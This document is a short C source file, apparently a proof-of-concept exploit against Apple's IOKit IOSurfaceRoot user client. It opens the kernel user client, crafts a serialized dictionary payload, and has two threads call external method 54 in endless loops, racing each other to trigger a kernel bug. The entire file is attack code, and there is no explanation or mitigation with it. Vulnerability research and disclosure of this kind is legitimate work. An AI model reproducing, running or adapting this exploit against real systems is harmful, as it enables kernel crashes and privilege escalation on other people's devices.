#include <stdio.h>
#include <pthread.h>
#include <IOKit/IOKitLib.h>
#include "poc.h"



io_connect_t glob_conn = 0;
char *inStr = 0;
size_t len = 0;


void *race1() {

if(!inStr || !len || !glob_conn) {
printf("Malformed req!\n");
return NULL;
}

while(1) {
    IOConnectCallMethod(glob_conn,54,0,0,inStr,len,0,0,0,0);
}

return NULL;
}

void *race2() {

if(!inStr || !len || !glob_conn) {
printf("Malformed req!\n");
return NULL;
}

while(1) {
    IOConnectCallMethod(glob_conn,54,0,0,inStr,len,0,0,0,0);
}

return NULL;
}





int run() {
    io_service_t surface = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if(!surface) {
    printf("IOKit obj doesn't exist???\n");
    return 2;
    }


    io_connect_t conn;
    kern_return_t kr = IOServiceOpen(surface,mach_task_self(),0,&conn);
    if(kr != KERN_SUCCESS) {
    printf("Failed to open userclient!\n");
    return 3;
    }

    glob_conn = conn;

    printf("Opened userclient!\n");
    
    
    uint32_t dict[] = {
        kOSSerializeBinarySignature,
        kOSSerializeArray | kOSSerializeEndCollecton | 1,
        kOSSerializeSymbol | 4 | kOSSerializeEndCollecton,
        0x00414141
    };
    
   
    char *buf = malloc(sizeof(dict) + 12);
    memcpy(buf+12, &dict, sizeof(dict));
    inStr = buf;
    len = sizeof(dict)+12;

    pthread_t th1;
    pthread_t th2;
    pthread_create(&th1,0,race1,0);
    pthread_create(&th2,0,race2,0);

    pthread_join(th1,0);
    pthread_join(th2,0);
    
    
    return 0;
    
}
